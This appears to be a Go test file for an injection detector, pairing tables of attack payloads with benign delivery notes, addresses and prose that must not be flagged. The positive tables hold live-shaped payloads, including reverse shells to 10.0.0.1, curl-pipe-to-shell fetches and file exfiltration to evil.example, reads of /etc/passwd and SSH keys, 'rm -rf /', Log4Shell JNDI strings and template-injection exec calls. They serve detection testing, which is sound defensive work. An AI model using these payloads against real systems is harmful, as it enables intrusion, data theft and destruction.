package detect

import (
	"strings"
	"testing"
	"time"

	"github.com/ergasterion-dev/aegolith/internal/model"
)

// injectionLegit is realistic customer input (delivery notes, product names,
// reviews, addresses, contact details) that no injection detector may flag.
var injectionLegit = []string{
	"milk & bread",
	"Gate code 1234 & leave at door",
	"see you; thanks",
	"Basmati Rice (5 kg)",
	"Long-grain; aged 2 years. Best for biryani/pulao.",
	"price: {{ check later }}",
	"Fresh & tasty 😋 – 5/5!",
	"Flat 3B, Rajbagh",
	"id card copy",
	"cat food 2kg",
	"50% off",
	"ayesha.khan@example.com",
	"https://example.com/review",
	"$5 off",
	"${price}",
	"{{name}}",
	"House #12, Lal Chowk, Srinagar 190001",
	"Please ring the bell, don't knock.\nCall on arrival.\r\nThanks!",
	"دودھ اور روٹی، دروازے پر چھوڑ دیں",
	"दूध और ब्रेड; गेट पर छोड़ दें",
}

// Positive and negative tables, package-level so that ScanText's tests
// (scan_test.go) can run every one of them through the combined scan.
var (
	cmdIPositives = []string{
		"; id",
		"| cat /etc/passwd",
		"`whoami`",
		"$(curl http://evil.example/x.sh | sh)",
		"&& wget http://evil.example/m -O /tmp/m",
		"; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
		"; nc -e /bin/sh 10.0.0.1 4444",
		`& type C:\Windows\win.ini`,
		"; powershell -enc SQBFAFgA",
		"9999999999; cat /etc/passwd",
		"() { :; }; /bin/bash -c 'cat /etc/passwd'",
		// Beyond the brief.
		"x;id",
		"$(id)",
		"|| ls -la",
		"1\nid -u",
		"%0Aid%3B",
		"x\n/bin/sh -i",
		"& type \\\\host\\share\\x",
		"& cmd /c whoami",
		"& dir /s",
		"; powershell -nop -c iex",
		"; nc -n -v -l -p 4444 -e /bin/sh",
		"; nc -lvnp 4444",
		"; nc -lvp 4444",
		"| nc -l -p 4444",
		"; ncat -e sh 10.0.0.1",
		"&& curl -X POST -d @/etc/passwd http://x",
		"; ping -c 3 -i 1 -W 1 -s 64 10.0.0.1",
		"; cat -- /etc/passwd",
		"; chmod +x m",
		"; chmod 777 /tmp/m",
		"; chmod u+s m",
		"%0aid",
		"%0aid%0a",
		"x%0awhoami",
		"x%0als%0a",
		"x%0D%0Aid",
		"a; /usr/bin/id",
		"& DIR C:\\",
		"; uname -a",
		"%3B%20id",
		"; rm -rf /",
		"| ping -c 3 10.0.0.1",
		"&& curl -s evil.example | sh",
		"; python -c 'import os'",
		"; chmod +x /tmp/m",
		"0<&196;exec 196<>/dev/udp/10.0.0.1/53",
		// Task 9 corpus tuning: the attack shapes next to the prose guards.
		"x & cat /etc/passwd",
		"x & id -u",
		"x & ls -la",
		"x & whoami",
		"x&id",
		"x & curl http://evil.example/x.sh | sh",
		"x & cat ~/.ssh/id_rsa",
		"see you; id -u",
		"see you; whoami",
		"; nc -4 -lvp 4444",
		"| type C:\\boot.ini",
		"; chmod 755 /tmp/m",
		"; chmod 755 m",
		"powershell -ec SQBFAFgA",
		"powershell -EncodedCommand SQBFAFgA",
		"powershell -ExecutionPolicy Bypass -File x.ps1",
		// Fix round 1: real flags after a prose "&" restore the full rules.
		"x & ping -c 21 127.0.0.1 &",
		"127.0.0.1 & ping -n 21 127.0.0.1 &",
		"x & nc 10.0.0.1 4444 -e /bin/sh",
		"x & nc 10.0.0.1 4444",
		"x & wget -O- http://evil/x",
		"x & curl -s http://evil/x",
		"x & ls -la /tmp",
		"x & rm -rf /",
		"x & cat /app/config.yaml",
		"powershell -ep bypass -File x.ps1",
		// Final fix wave: still attacks next to the tighter prose-"&" guard.
		"x & cat /.env",
		"x & ls -lah /tmp",
		"x & ping -c 3 10.0.0.1",
		"x & nc -lvp 4444",
		"x & cat -n /etc/passwd",
	}
	cmdINegatives = []string{
		"see you; id card copy",
		"Bring your ID; ID card copy needed",
		"Call on arrival\nID",
		"milk | cat food",
		"Toys; cat $5 each",
		"type of rice?",
		"Rice; type: basmati",
		"Hair care | curl cream",
		"Ring bell; ping me when here",
		"Flat 3B; rm 12",
		"Pets: snake | python",
		"Birthday bash; balloons & cake",
		"Sizes S | M | L | XL",
		"Rs 500; /kg",
		"Go straight; dir left after the mosque",
		"cat/dog bowl; cat /2 bags",
		"Monday & Tuesday & cmd",
		"Smile () thanks",
		"ls",
		"whoami is a fun game",
		"Fresh & ls brand",
		"Leave with guard & sh. Ali",
		"Nice shop | nice people",
		"House 12, Main Bazar\nTimergara\nDir",
		"Timergara; Dir",
		"Order & type -C cable",
		"Gift wrap\nType -Large",
		"Rice; type -- basmati",
		"Dog food & cat -- both great",
		"bring id\nid -- card",
		"Pack & curl -ing iron",
		"mobile: 0300-1234567 | ping -me",
		"Pet shop: dog & cat https://example.com/cat-food",
		"Notes:\nls",
		"Notes:\nid\nThanks",
		"Upper Dir / Lower Dir",
		"Sizes & type -- S, M, L",
		"Shirt size -L size",
		"T-shirt & cat -L size",
		"Mug | cat -XL",
		"Tea & cat -lovers mug",
		"Cat litter; cat -5 kg off",
		"Delivery & ping -Ali at gate",
		"House 12\nNear Main Bazar\nDir Upper\nPhone 0300-1234567",
		"Tea & ls -lovers mug",
		"Notes; chmod later",
		"Call me | nc -sorry 12 hours",
		// Task 9 corpus false-positive candidates.
		"see you; id",
		"Thanks a lot; ls",
		"Bring CNIC & id -card",
		"Bring passport & id",
		"Hair & curl https://example.com/curling-iron",
		"dog & cat /dog-food",
		"Pack of 2 | type /a",
		"Powershell -experience required",
		"Delivery & ping -me at 10.0.0.1",
		"Size: M | nc -2 3",
		"Notes; chmod 755",
		"type -C cable",
		"cat -- both",
		"House 12, Main Bazar\nDir",
		"Mohalla Bazar\nDir Upper, KP",
		// Final fix wave: English words after a dash, one-segment web paths.
		"Delivery & ping -me 10.0.0.1",
		"Tea & cat -lovers /club",
		"Dog & cat /pet-food.html",
		"Snacks & cat -the /treats",
		"Mom & ping -you 192.168.1.1",
	}
	codeIPositives = []string{
		"<?php system($_GET['c']); ?>",
		"eval(base64_decode('cGhwaW5mbygpOw=='))",
		"require('child_process').exec('id')",
		// Beyond the brief.
		"<?= `id` ?>",
		"<?PHP echo 1; ?>",
		"assert (base64_decode('cGhwaW5mbygpOw=='))",
		"process.mainModule.require('child_process').execSync('id')",
		`require("child_process").spawn("sh")`,
		"%3C%3Fphp%20phpinfo()%3B",
	}
	codeISerializedPositives = []string{
		"rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
		"aced00057372001",
		"data=rO0ABXNy",
		"ACED0005737200",
		// G1b: the stream as a path segment, after a '/', with a type code.
		"/api/v1/probe/rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeA==",
		"/rO0ABXNyABdqYXZhLnV0aWwuUHJpb3JpdHlRdWV1ZQ==",
		"/api/v1/x/rO0ABXQABWhlbGxv",
	}
	codeINegatives = []string{
		"eval(uation) pending",
		"assert your rights",
		"<? what is this",
		"Is it <?",
		"base64_decode is a function name",
		"child process care",
		"the process. mainModule",
		"aced0005-9b1e-4c1a-8f00-123456789abc",
		"order xrO0ABXNy",
		// G1b near misses: '/' counts as a boundary only before a header and
		// a type code (rO0ABX), so a base64 blob that holds "/rO0AB" mid-run
		// and segments that merely contain rO0 stay clean.
		"/9j/4AAQSkZJRgABAQ/rO0ABcdEfGh+IjKlMn/rO0ABQ==",
		"/api/v1/files/rO0x9KpQ2mZ7bWc4dGVzdA",
		"/api/v1/files/abcrO0ABXNyQmZ7bWc4dGVzdA",
		"/api/v1/files/9f3caced0005b1e2c4d6e8f0a1b3c5d7",
		"/api/v1/files/dGhpcyBpcyBhIGxvbmcgYmFzZTY0IGlkZW50aWZpZXIgZm9yIGEgZmlsZQ",
		"Room 0AB, block 5",
		"I'm in the middle of a process.",
	}
	ldapPositives = []string{
		"*)(uid=*))(|(uid=*",
		// Beyond the brief.
		"admin)(&(password=*)",
		"x)(!(objectClass=*)",
		"*)(objectClass=*",
		"%2A%29%28uid%3D%2A",
	}
	ldapNegatives = []string{
		"(2 pcs)(blue)",
		"Rice (5 kg) * (2)",
		"smile :)(",
		"*(see note)",
		"a*b",
		"Size (M)(L) & (XL)",
		"5 stars* (see review)",
	}
	sstiPositives = []string{
		"{{config.items()}}",
		"{{''.__class__.__mro__[1].__subclasses__()}}",
		"${T(java.lang.Runtime).getRuntime().exec('id')}",
		"{{ .Env }}",
		// Beyond the brief.
		"{{config}}",
		"{{ self._TemplateReference__context }}",
		"{{request.application.__globals__}}",
		"{{ 7*7 }}",
		"{{ x | safe }}",
		"{{ lipsum() }}",
		"#{7*7}",
		"#{T(java.lang.Runtime)}",
		"<%= 7*7 %>",
		"{% import os %}",
		"{%for x in y%}",
		"%7B%7Bconfig%7D%7D",
		"{{ {{config.items()}}",
	}
	sstiNegatives = []string{
		"{{ first_name }}",
		"Hi {{name}}, your order {{order_id}} is ready",
		"{{ self pickup }}",
		"{{ special request please }}",
		"{{ configure later }}",
		"{{...}}",
		"{{",
		"}} {{",
		"Order #{12}",
		"Flat #{3B}",
		"#1 seller",
		"<% off",
		"50% {%} off",
		"{% discount %}",
		"Total ${ 500 }",
		"${T}",
	}
	jndiPositives = []string{
		"${jndi:ldap://evil.example/a}",
		"${${lower:j}ndi:${lower:l}dap://evil.example/a}",
		"${jndi:rmi://evil.example/x}",
		"${jndi:dns://evil.example/a}",
		// Beyond the brief.
		"${JnDi:ldap://evil.example/a}",
		"${${::-j}${::-n}${::-d}${::-i}:ldap://evil.example/a}",
		"${${env:BARFOO:-j}ndi${env:BARFOO:-:}ldap://evil.example/a}",
		"${${upper:j}${upper:n}di:ldap://evil.example/a}",
		"User-Agent: ${jndi:ldap://evil.example/a",
		"%24%7Bjndi:ldap://evil.example/a%7D",
	}
	jndiNegatives = []string{
		"${name} lower:",
		"jndi:ldap is a Java thing",
		"${lower:hello}",
		"${::-x}${::-y}",
		"}}}${${${",
	}
	crlfPositives = []string{
		"x%0d%0aSet-Cookie:%20admin=true",
		"x\r\nSet-Cookie: admin=true",
		// Beyond the brief.
		"x\nset-cookie : a=1",
		"x%0aLocation:%20http://evil.example",
		"x\r\nLocation: //evil.example",
		"x%0D%0AContent-Length:%200",
		"x\r\nContent-Type: text/html",
		"x\rTransfer-Encoding: chunked",
		"x\r\nAccess-Control-Allow-Origin: *",
		// Location with any URL shape, and a Refresh redirect.
		"a\r\nLocation: \\\\evil.example",
		"a\r\nLocation: javascript:alert(1)",
		"a\r\nlocation:data:text/html,x",
		"a\r\nRefresh: 0;url=http://evil.example",
		"x%0d%0aRefresh:%205,%20URL=//evil.example",
	}
	crlfNegatives = []string{
		"Line 1\nNote: ring bell",
		"Address:\r\nFlat 3B\r\nLocation: near masjid",
		"Item list\nContent: rice, dal",
		"Time:\n5pm",
		"Notes\r\nSet up a time: 5pm",
		"Set-Cookie: on one line is just text",
		"Cookie: chocolate chip\nCookies: 2 packs",
		"Address:\r\nLocation: Karachi: Block 5",
		"Address:\nLocation: Main St. 5:30pm pickup",
		"Steps\r\nRefresh: later please",
		"Steps\nRefresh: 5, then retry",
		"Line\nLocation:",
	}
)

func assertHits(t *testing.T, name string, fn func(string) (Hit, bool), want Hit, vals []string) {
	t.Helper()
	for _, v := range vals {
		hit, ok := fn(v)
		if !ok {
			t.Errorf("%s(%q) = no hit, want hit", name, v)
			continue
		}
		if hit != want {
			t.Errorf("%s(%q) = %+v, want %+v", name, v, hit, want)
		}
	}
}

func assertNoHits(t *testing.T, name string, fn func(string) (Hit, bool), vals []string) {
	t.Helper()
	for _, v := range append(append([]string(nil), vals...), injectionLegit...) {
		if hit, ok := fn(v); ok {
			t.Errorf("%s(%q) = %+v, want no hit", name, v, hit)
		}
	}
}

func TestCmdIPositives(t *testing.T) {
	want := Hit{RuleID: "AEG-CMDI-001", Category: model.CatCmdi, Severity: model.SeverityCritical}
	assertHits(t, "CmdI", CmdI, want, cmdIPositives)
}

func TestCmdINegatives(t *testing.T) {
	assertNoHits(t, "CmdI", CmdI, cmdINegatives)
}

// TestCmdISleepPrefix: a one-word (or word and number) prefix written as
// prose before "; sleep N" is not command injection; a leading operator, a
// shell-only operator ("&&", "|") or a prefix glued to the operator with no
// blank after it ("1;sleep 5") stays a hit.
func TestCmdISleepPrefix(t *testing.T) {
	want := Hit{RuleID: "AEG-CMDI-001", Category: model.CatCmdi, Severity: model.SeverityCritical}
	assertHits(t, "CmdI", CmdI, want, []string{
		"; sleep 10",
		"x| sleep 10 |",
		";sleep 10",
		"a && sleep 10",
		"1;sleep 5",
		"Mon;sleep 8",
		"Mon; sleep 8 &",
		"Mon; sleep 8; id",
		"Mon%3B%20sleep%208%20%7C",
		// The token before "; " is not a plain word or number.
		"127.0.0.1; sleep 10",
		"127.0.0.1; sleep 5",
		"8.8.8.8; sleep 10",
		"ping -c 1 127.0.0.1; sleep 10",
		"file.txt; sleep 10",
		"a=1; sleep 10",
		"$x; sleep 10",
		"x-y; sleep 10",
		"a:b; sleep 10",
		"/tmp; sleep 10",
		"127.0.0.1;  sleep 10",
		"127.0.0.1; sleep  10",
		// A semicolon that still arrives percent-encoded after transport
		// decoding was encoded twice: that is a scanner, not a person.
		"foo%3B%20sleep%2010",
		"Mon%3B%20sleep%208",
		"Mon%3b sleep 8",
		// alpha.6: a value that is one ASCII letter or a number before
		// "; " is a probe, not a note. This was an accepted miss in alpha.5.
		"1; sleep 5",
		"x; sleep 10",
		"x;  sleep 10",
		"x; sleep  10",
		"42; sleep 10",
		"a; sleep 5",
	})
	assertNoHits(t, "CmdI", CmdI, []string{
		"Mon; sleep 8",
		"Gate 2; sleep 10",
		"Good night; sleep 8",
		"Tired & sleep 8",
		"Café; sleep 8",
		// A word or a word and number before "; sleep N" reads like a
		// note. A one-letter or all-digit value before it is a probe (above).
		"Mo; sleep 8",
		"Room 5; sleep 8",
		"2 kids; sleep 8",
		"Night; sleep 9",
	})
	// Other commands keep their rules after a one-word prefix.
	assertHits(t, "CmdI", CmdI, want, []string{
		"Mon; id",
		"Gate 2; ls",
		"x; cat /etc/passwd",
		"Mon; whoami",
	})
}

// TestCmdIVariants covers the G4 lab payloads: a quote- or
// backslash-split command word, sleep with a number, and a bare command
// after a line break that arrived percent-encoded (the query string, where
// ScanQueryText applies).
func TestCmdIVariants(t *testing.T) {
	want := Hit{RuleID: "AEG-CMDI-001", Category: model.CatCmdi, Severity: model.SeverityCritical}
	assertHits(t, "CmdI", CmdI, want, []string{
		"x%0aid",
		"; sleep 10",
		";sleep 5",
		"| sleep 10 |",
		"& sleep 10 &",
		"x%0asleep%2010",
		";w'h'o'am'i",
		`;wh""oami`,
		`;c\at /et\c/pas\swd`,
		`;'i'd`,
		`| \l\s -la`,
	})
	assertNoHits(t, "CmdI", CmdI, []string{
		"Notes:\nls",
		"Notes:\nsleep 8",
		"rest; sleep well",
		"it's; fine",
		`C:\temp\notes`,
		`Folder; C:\temp\notes`,
		"Tea & sleep 8 hours",
		"Kids & sleep 8",
		"Long day; sleep 8",
		"Sure; i'd love it",
		"OK; i'd",
		"Rest; don't sleep",
		"; sleep 8 hours",
		"; sleeping 10",
		"x; sleep 1.5h then go",
	})
	for _, v := range []string{"x\nid", "x\r\nwhoami", "x\nsleep 10"} {
		if hits := ScanQueryText(v); !containsRule(hits, want.RuleID) {
			t.Errorf("ScanQueryText(%q) = %+v, want %s", v, hits, want.RuleID)
		}
		if hits := ScanText(v); containsRule(hits, want.RuleID) {
			t.Errorf("ScanText(%q) = %+v, want no %s (literal line break is prose)", v, hits, want.RuleID)
		}
	}
}

// TestCmdIAlpha6Prose covers the alpha.6 false positives: a two-letter
// locale token in a User-Agent comment, a word after a dash in "Tea & cat
// -cozy /club", a single-backtick inline-code span in prose, and a bare
// command after a line break that follows a prose line in a query value.
// Each has attack counter-cases that must stay hits.
func TestCmdIAlpha6Prose(t *testing.T) {
	want := Hit{RuleID: "AEG-CMDI-001", Category: model.CatCmdi, Severity: model.SeverityCritical}
	clean := []string{
		// User-Agent comments: "; id;" and "; id)" are the Indonesian
		// locale tag, not a command.
		"Mozilla/5.0 (Linux; U; Android 4.4.2; id; SM-G900 Build/KOT49H) AppleWebKit/534.30 Mobile Safari/534.30",
		"UCWEB/2.0 (Symbian; U; S60 V3; id; NokiaE63)",
		"Mozilla/5.0 (BlackBerry; U; BlackBerry 9220; id) AppleWebKit/534.11+ (KHTML, like Gecko) Mobile Safari/534.11+",
		"Opera/9.80 (J2ME/MIDP; Opera Mini/4.2; U; id) Presto/2.5.25",
		// A word after a dash, then a one-segment web path.
		"Tea & cat -cozy /club",
		"Gifts & cat -cute /shop",
		// Inline code in prose.
		"Use `ls` to list files",
		"Se også: `id`.",
		"On LoongArch, `uname -m` returns `loongarch64`",
		"Zie ook: `id`.",
		"See the `id` command, then `ls` it.",
		"ls -l --escape: see `ls -l --escape` for details.",
		"Run `curl --version` to check it.",
		"यह आदेश `id --user --name` का उपनाम है।",
		"此命令為 `id` 的別名。",
	}
	assertNoHits(t, "CmdI", CmdI, clean)
	for _, v := range clean {
		if hits := ScanText(v); containsRule(hits, want.RuleID) {
			t.Errorf("ScanText(%q) = %+v, want no %s", v, hits, want.RuleID)
		}
	}
	hits := []string{
		"; id",
		"x; id; ls",
		"`id`",
		"x`id`",
		"$(id)",
		"a;cat /etc/passwd",
		"127.0.0.1; ls",
		"| id",
		"&& id",
		"() { :;}; /bin/id",
		"Mozilla/5.0 () { :;}; /bin/id",
		// UA-shaped values keep every other command shape.
		"Mozilla/5.0 (Linux; id -u)",
		"Mozilla/5.0 (Linux; cat /etc/passwd)",
		"Mozilla/5.0 (Linux; $(id))",
		"Mozilla/5.0 (Linux; `id`)",
		"Mozilla/5.0 (Linux) ; id",
		"Mozilla/5.0 (Linux);id",
		"Mozilla/5.0 (Linux; whoami)",
		"Mozilla/5.0 (Linux;id)",
		"(Linux; id)",
		"Mozilla/5.0 (Linux; sleep 10)",
		"Mozilla/5.0 (Linux%3B id)",
		// A dashed word does not hide a system path.
		"Tea & cat -cozy /etc/passwd",
		"x & cat -cozy ~/.ssh/id_rsa",
		"x & cat -n /club/x",
		// Backticks after an operator, glued to a word, with nothing after the
		// span, or percent-encoded stay command substitution.
		"x; `id`",
		"x | `id` now",
		"x && `id` now",
		"x = `id` now",
		"Name `id`",
		"Use `id`",
		"Use %60ls%60 to list files",
		"Use `ls` id",
		"Use `curl http://evil.example/x | sh` now",
		"Use `ls`; id",
		"x\n`id`",
		// Fix round 1: only a command word with letter-only flags is excused
		// in a prose span; an argument, a path, a URL, a number, -c/-e or a
		// flag on an interpreter or netcat keeps the span a hit.
		"a `sleep 10` b",
		"a `curl -o /tmp/x http://e.example/x` b",
		"Run `wget http://e.example/x -O /tmp/x` now",
		"a `bash -c 'id'` b",
		"a `sh -c 'id'` b",
		"a `python -c 'import os'` b",
		"x `cat /etc/passwd` y",
		"a `nc -e /bin/sh 10.0.0.1 4444` b",
		"a `nc -lvp 4444` b",
		"a `ping -c 3 10.0.0.1` b",
		"a `w'h'o'am'i` b",
		"Send it to the terminal `/dev/tty5`:",
		"Create a pool using `/var/vms` as the storage",
		"a `ls /tmp` b",
		"a `rm -rf /` b",
		// Fix round 1: a User-Agent comment must be closed.
		"x/1 (; id",
		"Mozilla/5.0 (Linux 4.4.2; id",
	}
	assertHits(t, "CmdI", CmdI, want, hits)

	// Query values: the engine decoded them once, so a line break arrived
	// encoded. After a prose line ("Dear team") a bare command is prose;
	// after a single token or a shell-like line it is a hit. Inline code
	// stays command substitution in a query value.
	query := Hit{RuleID: "AEG-CMDI-001", Category: model.CatCmdi, Severity: model.SeverityCritical}
	assertNoHits(t, "cmdIQuery", cmdIQuery, []string{
		"Dear team\nid",
		"Dear team,\nls\nThanks",
		"Dear team\r\nid",
		"Hello there\n\nid",
		"Tea & cat -cozy /club",
		"Mozilla/5.0 (Linux; U; Android 4.4.2; id; SM-G900 Build/KOT49H)",
	})
	assertHits(t, "cmdIQuery", cmdIQuery, query, []string{
		"x\nid",
		"x\r\nid",
		"127.0.0.1\nid",
		"x;\nid",
		"Dear team\nid -u",
		"Dear team\ncat /etc/passwd",
		"Dear team\nid; ls",
		"Dear team%0aid",
		// Fix round 1: after a prose line only a lone "id" or "ls" is a word.
		"foo bar\nsleep 10",
		"foo bar\nsleep 10\n",
		"foo bar\nwhoami",
		"foo bar\nuname",
		"foo bar\nsh",
		"foo bar\nls /tmp",
		"foo bar\nid -u",
		"a=b c\nid",
		"Use `ls` to list files",
		"Se også: `id`.",
	})
}

// TestCmdIAlpha6AcceptedMisses pins the attack shapes alpha.6 lets through
// to clear the prose above (threat model, "Changes in alpha.6"; corpus
// README trade-off table). If one starts to hit, update those documents.
func TestCmdIAlpha6AcceptedMisses(t *testing.T) {
	assertNoHits(t, "CmdI", CmdI, []string{
		// UA-shaped value: a two-letter bare command after "; " inside a
		// closed comment.
		"Mozilla/5.0 (x; id)",
		"Mozilla/5.0 (x; id; ls)",
		"a/1 (b; sh)",
		"Mozilla/5.0 (x; ls)",
		// A four-letter two-vowel word after a dash, then a one-segment path.
		"x & cat -cozy /flag",
		"x & cat -easy /flag.txt",
		// Prose backtick span: a command word with letter-only flags (no
		// -c/-e, no flag at all on sh, bash, python, perl, nc, ncat, netcat).
		"a `id` b",
		"x: `ls`.",
		"a `whoami` b",
		"a `uname -a` b",
		"a `sh` b",
		"Note: `id` here",
		"a `ls -la` b",
		"ab; sleep 10",
		"x 1; sleep 5",
		// "$(" after a blank holding one letter-only word that is not a
		// listed command, then the end, a blank or punctuation: read as a
		// dollar amount in prose ("costs $(approx) 5").
		"a $(foo) b",
		"$(foo)",
		// A line break inside a substitution ends the scan.
		"$(echo\nhi)",
	})
	// Query value: a prose line, a line break, then "id" or "ls" alone.
	assertNoHits(t, "cmdIQuery", cmdIQuery, []string{"foo bar\nid", "foo bar\nid\n", "foo bar\nls"})
}

// TestCmdISubstitutionEcho covers the alpha.6 recall rules: a "$(" or
// "$((" substitution of any word (commix's default probe), and echo after a
// shell operator with a "$", backtick or quote argument. Prose dollar
// amounts and the word "echo" in prose stay clear.
func TestCmdISubstitutionEcho(t *testing.T) {
	want := Hit{RuleID: "AEG-CMDI-001", Category: model.CatCmdi, Severity: model.SeverityCritical}
	hits := []string{
		";echo IPTSZG$((46+17))$(echo IPTSZG)IPTSZG",
		"||echo TVGLAW$((25+16))$(echo TVGLAW)TVGLAW|",
		"%3Becho%20IPTSZG%24%28%2846%2B17%29%29%24%28echo%20IPTSZG%29IPTSZG",
		"$(echo hi)",
		";echo `id`",
		"x$(foo)",
		"$((1+2))",
		"x$((7*7))y",
		"a $(foo bar) b",
		"; echo $HOME",
		"| echo 'x'",
		"&& echo \"pwned\"",
		"||echo `whoami`",
		"x;echo $((3+4))",
		"Mozilla/5.0 (Linux; echo $(id))",
		"see you; echo $HOME",
		"x; echo \"hi\"",
		"; echo ${PATH}",
		"; echo $?",
		// Fix round 1: listed commands in the prose dollar shape, and blank
		// padding before the closing parenthesis.
		"x $(reboot)",
		"x $(halt)",
		"a $(hostname) b",
		"x $(hostname)",
		"see $(env) now",
		"q $(printenv)",
		"x $(Reboot)",
		"x $(poweroff)",
		"x $(shutdown)",
		"$(hostname)",
		"$(echo" + strings.Repeat(" ", 130) + ")",
		"$(reboot" + strings.Repeat(" ", 130) + ")",
		"$((1" + strings.Repeat(" ", 130) + "+2))",
	}
	assertHits(t, "CmdI", CmdI, want, hits)
	assertHits(t, "cmdIQuery", cmdIQuery, want, hits)
	prose := []string{
		"costs $(approx) 5",
		"It costs $(approx) 5 dollars",
		"Price ($5)",
		"$5 (usd)",
		"$ (5)",
		"Pay $(5",
		"$()",
		"$( )",
		"Total: $ (approx.)",
		"Echo Park; echo of the past",
		"echo \"hi\"",
		"The echo 'rang' out",
		"Tom & echo \"hi\"",
		"hello; echo of silence",
		"Echo; Echo $5",
		"see you; echo \"hi\"",
		// Fix round 1: numeric amounts after "$(".
		"Total $(5)",
		"US$(10)",
		"Balance shows $(45.00), please refund",
		"Net: $(1,234.56)",
		"$(45.00)",
		"$(1,234.56)",
		// A single word in the prose dollar shape after "(" or at the start.
		"($(approx) 5)",
		"$(amount) due",
		"(about $(approx))",
		// A jQuery call on one bare name reads the same way.
		"$(document).ready(fn) not firing",
		// A one-word "; " prefix: a quote after echo is prose quoting, and
		// "$5" is an amount.
		"Mon; echo \"hi\"",
		"Yes; echo \"same\"",
		"Ok; echo $5 back",
		"Mon; echo hi",
	}
	adversarial := []string{
		strings.Repeat("$(", 4096),
		strings.Repeat("$((", 2730),
		"$(" + strings.Repeat("a", 8192),
		"$(a" + strings.Repeat(" b", 4096),
		"$(a" + strings.Repeat(" ", 8192),
	}
	for _, set := range [][]string{prose, adversarial} {
		assertNoHits(t, "CmdI", CmdI, set)
		assertNoHits(t, "cmdIQuery", cmdIQuery, set)
	}
	for _, v := range prose {
		if hits := ScanText(v); containsRule(hits, want.RuleID) {
			t.Errorf("ScanText(%q) = %+v, want no %s", v, hits, want.RuleID)
		}
	}
	// Accepted costs, flagged as code-like text (threat model, "Changes in
	// alpha.6"; corpus README).
	assertHits(t, "CmdI", CmdI, want, []string{
		"$(this.el).hide() not working",
		"$((a+b)) is the sum",
		"costs $(about 5)",
		"around $(approx. 50)",
	})
}

func TestCodeIPositives(t *testing.T) {
	want := Hit{RuleID: "AEG-CODEI-001", Category: model.CatCodei, Severity: model.SeverityCritical}
	assertHits(t, "CodeI", CodeI, want, codeIPositives)
	ser := Hit{RuleID: "AEG-CODEI-002", Category: model.CatCodei, Severity: model.SeverityCritical}
	assertHits(t, "CodeI", CodeI, ser, codeISerializedPositives)
}

func TestCodeINegatives(t *testing.T) {
	assertNoHits(t, "CodeI", CodeI, codeINegatives)
}

func TestLDAPPositives(t *testing.T) {
	want := Hit{RuleID: "AEG-LDAP-001", Category: model.CatLDAP, Severity: model.SeverityHigh}
	assertHits(t, "LDAP", LDAP, want, ldapPositives)
}

func TestLDAPNegatives(t *testing.T) {
	assertNoHits(t, "LDAP", LDAP, ldapNegatives)
}

func TestSSTIPositives(t *testing.T) {
	want := Hit{RuleID: "AEG-SSTI-001", Category: model.CatSSTI, Severity: model.SeverityHigh}
	assertHits(t, "SSTI", SSTI, want, sstiPositives)
}

func TestSSTIGoActionsAndEL(t *testing.T) {
	want := Hit{RuleID: "AEG-SSTI-001", Category: model.CatSSTI, Severity: model.SeverityHigh}
	assertHits(t, "SSTI", SSTI, want, []string{
		`{{printf "%v" .}}`,
		"{{ call .Func }}",
		`{{define "x"}}{{.}}{{end}}`,
		`{{ printf "%s" .Secret }}`,
		"{{ range .Items }}",
		"{{ index .Map \"k\" }}",
		"${7*7}",
		"${ 7 + 7 }",
		"${user.password}",
		"${Runtime.getRuntime()}",
	})
	assertNoHits(t, "SSTI", SSTI, []string{
		"${PRICE}",
		"${total}",
		"${5}",
		"${5.99}",
		"{{ best price }}",
		"{{name}}",
		"{{ index }}",
		"{{ with love }}",
		"{{ call me }}",
		"{{ html }}",
		"Pay ${ 500 } now",
		"${env:HOME.x}",
	})
}

func TestSSTIELMemberAccess(t *testing.T) {
	want := Hit{RuleID: "AEG-SSTI-001", Category: model.CatSSTI, Severity: model.SeverityHigh}
	assertNoHits(t, "SSTI", SSTI, []string{
		"${order.total}",
		"${user.name}",
		"${file.txt}",
		"${price}",
		"${a.b.c}",
		"${amount(usd)}",
		"${total}",
		"Your total is ${order.total} today",
		"${cart.items.count}",
		"${order.key}",
		"${license.key}",
		"${student.class}",
		"${t.title}",
		"${item.t}",
	})
	assertHits(t, "SSTI", SSTI, want, []string{
		"${7*7}",
		"${user.password}",
		"${env.SECRET}",
		"${user.getClass()}",
		"${T(java.lang.Runtime).getRuntime()}",
		"${''.class.forName('x')}",
		"${java.lang.Runtime}",
		"${System.getenv()}",
		"${request.session.id}",
		`${"id".execute()}`,
		`${"freemarker.template.utility.Execute"?new()("id")}`,
		`${ex("id")}`,
		"${__import__('os').popen('id').read()}",
		"${self.__init__.__globals__}",
		"${pageContext.servletContext.classLoader}",
		"${user.pwd}",
		"${db.credentials}",
		"${app.apiKey}",
		"${x?api.getClass()}",
		"${obj.getClassLoader()}",
	})
}

func TestSSTINegatives(t *testing.T) {
	assertNoHits(t, "SSTI", SSTI, sstiNegatives)
}

// TestSSTIAlpha6Templates covers the alpha.6 template readings: a filter
// pipe in {{ }} is code only when attack-shaped, a short i18n call in ${ }
// is data, and a plain data path in #{ } is data.
func TestSSTIAlpha6Templates(t *testing.T) {
	want := Hit{RuleID: "AEG-SSTI-001", Category: model.CatSSTI, Severity: model.SeverityHigh}
	assertNoHits(t, "SSTI", SSTI, []string{
		// Plain filter pipes (Jinja, Django, Liquid) on a data path.
		"{{ price | currency }}",
		"Dear {{ name|title }},",
		"{{ user.name | upper }}",
		"{{ name | lower | title }}",
		"{{name|title}}",
		"Hi {{ first_name|capfirst }}, your order {{ order.id }} shipped",
		"{{ a|b }}",
		"{{zsh|sh|ksh|csh}}",
		"{{ name\n| title }}",
		// tldr option alternation.
		"git stash {{[-p|--patch]}}",
		"flox {{[l|list]}}",
		"id {{[-u|--user]}}",
		"trafilatura {{[-u|--URL]}} {{url}} {{[-o|--output-dir]}} {{path/to/output.txt}}",
		"docker {{[images|image ls]}}",
		"tool {{[e|edit]}} {{[-un|--user --name]}} {{[-g|--global]}}",
		"deploy {{dev|test|production|...}}",
		"open {{path/to/file|url}}",
		"press {{<ArrowLeft>|<ArrowRight>}}",
		"export {{--csv|--tsv}} {{[-w|--width=]}} {{[-?|--help]}}",
		"rotate {{180|360|720}}",
		"stty {{raw|cooked}}",
		"kubectl {{[c|config]}} {{[ns|namespace]}} {{b|k|m|g}}",
